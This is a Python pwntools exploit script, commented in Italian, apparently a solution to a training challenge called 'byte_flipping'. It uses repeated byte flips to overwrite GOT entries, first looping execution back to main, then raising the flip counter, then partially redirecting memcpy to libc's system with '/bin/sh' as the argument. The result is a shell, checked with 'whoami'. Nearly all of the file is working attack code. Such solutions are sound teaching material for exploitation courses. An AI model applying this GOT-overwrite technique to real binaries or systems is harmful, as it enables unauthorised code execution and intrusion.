from pwn import *
import time
import subprocess
import sys

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "error"


while True:
    if args["REMOTE"]:
        r = remote("bin.training.offdef.it", 4003)
    else:
        r = process("./byte_flipping")
    

    time.sleep(0.5)
    r.sendline(b"giulio")       #primo loop
    time.sleep(0.2)
    r.sendline(b"0x602050")     #sostituisco exit in got con indirizzo main per riavviare
    time.sleep(0.2)
    r.sendline(b"0xc7")
    time.sleep(0.2)
    r.sendline(b"0x602051")
    time.sleep(0.2)
    r.sendline(b"0x07")
    time.sleep(0.2)
    r.sendline(b"e")
    time.sleep(0.2)
    r.sendline(b"0x100")        # mando un valore grande per eseguire la exit -> jumpa a main
    time.sleep(0.2)             # ora ogni volta che metto un value grande rinizio da main
    

    r.sendline(b"giulio")       # secondo main
    time.sleep(0.2)
    r.sendline(b"0x00602068")   # riscrivo flips per ciclare all'infinito
    time.sleep(0.2)
    r.sendline(b"0xff")         # flips = 0xff
    time.sleep(0.2)
    r.sendline(b"e")
    time.sleep(0.2)
    r.sendline(b"0x100")        # riavvio di nuovo
    time.sleep(0.2)
    

    r.sendline(b"/bin/sh\x00")  # terzo main, preparo l'argomento di system dentro a name
    time.sleep(0.2)
    r.sendline(b"0x00602038")   # riscrivo il puntatore a memcpy in GOT con quello di system
    time.sleep(0.2)
    r.sendline(b"0x60")         # libc-2.35.so, system = 0x050d60 (devo riscrivere gli ultimi 3 byte del puntatore)
    time.sleep(0.2)             #                          ^
    r.sendline(b"0x00602039")   #                          |
    time.sleep(0.2)             # questo nimble sarà casuale, l'exploit funzionerà in media 1/16
    r.sendline(b"0x0d")         #
    time.sleep(0.2)             # l'istruzione 0x4008e9 è prima della memcpy ed è LEA RDI, [name] (perfetta per system)
    r.sendline(b"0x0060203a")
    time.sleep(0.2)
    r.sendline(b"0xc5")
    time.sleep(0.2)
    r.sendline(b"e")
    time.sleep(0.2)
    r.sendline(b"0x100")        # riavvio di nuovo
    time.sleep(0.2)
    
    r.send(b"\x00" * 0x20)  # quarto main, questo valore potrebbe essere qualsiasi cosa, non verrà memorizzato
    time.sleep(0.2)
    
    try:
        r.recvrepeat(timeout=1)
        r.sendline(b"whoami")
        print(r.recvall(timeout=0.2), end="")
    except:
        print(r.recvall(timeout=0.2))
        r.close()
    finally:
        print(r.recvall(timeout=0.2))
        r.close()
